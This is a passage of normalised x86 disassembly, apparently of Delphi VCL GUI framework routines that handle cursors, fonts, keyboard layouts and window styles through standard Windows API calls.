dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4599e8
pop ecx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4403fc
mov ebx eax
test [ ebx + 0x51 ] 0x80
je r-xdata
sub_459a58
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x78 ]
mov esi [ ebx + 0x248 ]
test esi esi
je r-xdata
push ebp
mov eax ebx
call sub_4599e8
pop ecx
mov eax [ esi + 0x34 ]
call sub_44ef40
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebx + 0x248 ]
mov eax [ eax + 0x34 ]
mov edx edi
call sub_44ef50
cmp [ eax + 0x3e ] 0x0
je r-xdata
sub_459adc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441a58
cmp [ esi + 0x4 ] 0x2f
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffd0
call sub_403454
sub_459b00
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff3
call sub_403454
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_459b30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_440438
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_459b00
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_459b30
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4403fc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_459bac
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_459b00
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_459b00
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_459b30
pop ecx
test al al
je r-xdata
sub_459c00
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x8 ]
mov eax ebx
mov si 0xfff0
call sub_403454
test al al
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov al 0x1
sub_459c30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_440438
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_459c00
pop ecx
test al al
jne r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_459c30
pop ecx
test al al
je r-xdata
mov al 0x1
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4403fc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_459cac
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebx + 0x220 ]
call sub_459c00
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x1
push ebp
mov eax ebx
call sub_459c00
pop ecx
test al al
jne r-xdata
push ebp
mov eax ebx
call sub_459c30
pop ecx
test al al
je r-xdata
sub_459d00
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_413f44
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_449170
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_459d54
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_459d00
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403454
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459dd0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_41a1bc
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_459e0c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_43d404
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_43e0d4
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_459e54
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_443a0c
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_443708
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_443708
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_443708
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_443708
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_443708
push eax
call RedrawWindow
sub_459fa8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_454d58
mov dl 0x5
mov eax ebx
call sub_456acc
mov dl 0x1
mov eax ebx
call sub_4422e4
mov dl 0x3
mov eax ebx
call sub_456dc8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_45a010
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45a0e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4421a4
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_442010
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_43c434
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43ce94
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_404098
mov eax [ ebp - 0xc ]
call sub_404268
push eax
mov eax [ ebp - 0xc ]
call sub_404468
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_43cea4
mov eax [ ebp - 0xc ]
call sub_404268
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a0ee
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
mov dl 0x1
mov eax esi
call sub_45614c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_43cf50
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_4045f4
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45a114
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_440438
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_455870
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_4403fc
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403454
inc ebp
dec edi
jne r-xdata
sub_45a160
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_4421a4
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_45a18c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4429ac
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_45a1b4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_45851c
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_443708
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_4421a4
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_443708
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_443708
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4421b8
or ecx 0xffffffff
mov dl 0x1
call sub_43d5c8
pop esi
pop ebx
retn
sub_45a24c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_442e1c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_43e0d4
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_43c8c0
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403454
sub_45a2a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45a36a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_43ce94
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_404098
mov eax [ ebp - 0x4 ]
call sub_404268
push eax
mov eax [ ebp - 0x4 ]
call sub_404468
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_43cea4
mov eax [ ebp - 0x4 ]
call sub_404268
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43cf50
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a371
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_45614c
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_4045f4
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_45a390
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_442b9c
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4421a4
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_4421b8
mov dl [ ebx + 0x57 ]
call sub_43ce40
inc edi
dec esi
jne r-xdata
sub_45a434
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45a464
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_45a494
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419a2c
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45a838
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_45a844
mov eax ebx
call sub_45a850
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_456c6c
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cc44
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cc44
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cc44
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_45ac70
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45ab4c
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45ab4c
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45ab4c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_45a5ec
push ebx
push esi
push edi
push ebp
call sub_4035e4
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_403258
mov eax [ ebp + 0x88 ]
call sub_403258
mov eax [ ebp + 0x84 ]
call sub_403258
mov eax [ ebp + 0x54 ]
call sub_403258
mov eax [ ebp + 0x50 ]
call sub_403258
mov eax [ ebp + 0x4c ]
call sub_403258
mov eax [ ebp + 0x30 ]
call sub_403258
mov eax [ ebp + 0x34 ]
call sub_403258
mov eax [ ebp + 0x7c ]
call sub_403258
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_403258
mov eax ebp
call sub_45a8ac
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_419a78
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4035cc
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_413f44
call sub_403258
inc edi
dec esi
jne r-xdata
sub_45a764
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_45a7b0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413de8
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413de8
mov eax [ rw-data ]
call sub_45d53c
sub_45a7e8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_414088
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_414088
mov eax [ rw-data ]
call sub_45d53c
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_444cc0
sub_45a850
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_45a908
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_45a8ac
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4026dc
mov ebx esi
test ebx ebx
jne r-xdata
sub_45a908
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026bc
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_45a930
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45aadb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45aae2
lea eax [ ebp - 0x260 ]
call sub_403fa8
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403fa8
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_415aec
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408d38
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_448468
test al al
je r-xdata
xor eax eax
push ebp
push sub_45aa97
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404218
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404218
sub_45ab4c
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_45d3ac
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45d160
mov dl 0x1
mov eax [ rw-data ]
call sub_45d160
sub_45abb8
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_45abe0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_45abb8
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406a10
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406998
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45ac70
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_45adb5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45d160
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41cfd4
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41cfd4
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_41d0b8
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41cfd4
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_41cfd4
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41cfd4
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_45d160
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_41ce18
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_41ce18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45adbc
cmp [ rw-data ] 0x0
je r-xdata
sub_45adf4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
